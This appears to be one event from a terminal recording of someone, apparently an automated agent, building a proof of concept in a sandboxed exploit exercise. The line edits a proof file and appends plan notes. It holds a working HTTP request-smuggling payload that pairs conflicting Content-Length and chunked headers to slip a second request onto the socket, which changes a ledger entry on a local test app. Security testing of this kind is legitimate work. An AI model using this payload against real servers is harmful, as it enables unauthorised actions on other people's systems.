[144.104551, "i", "python3 - <<'PY'\nimport json\np='/testbed/proof.json';d=json.load(open(p));d['steps'][6]['sends']=[{'text':'POST /work/ HTTP/1.1\\r\\nHost: 127.0.0.1:9090\\r\\nCookie: sessionid={{cookie:sessionid}}\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET {{var:post}} HTTP/1.1\\r\\nHost: 127.0.0.1:9090\\r\\nCookie: sessionid={{cookie:sessionid}}\\r\\nConnection: close\\r\\n\\r\\n','delay_ms':0}];d['steps'][6]['read_timeout_ms']=2000\nwith open(p,'w') as f:json.dump(d,f,indent=2)\nPY\ncat >> /app/output/plan.md <<'EOF'\n- Raw HTTP/1.1 baseline post succeeds. A harmless pipelined request with `Connection: close` correctly prevents the second post request; entry stays unposted.\n- A conflicting-framing request (`Content-Length: 4` and `Transfer-Encoding: chunked`, zero chunk), followed on the SAME socket by a complete posting GET, yields HTTP 400 then 302; official entry detail changes to posted with balanced $17 lines. Replaced proof's raw step with this candidate. Need clean-reset replay.\nEOF\n"]
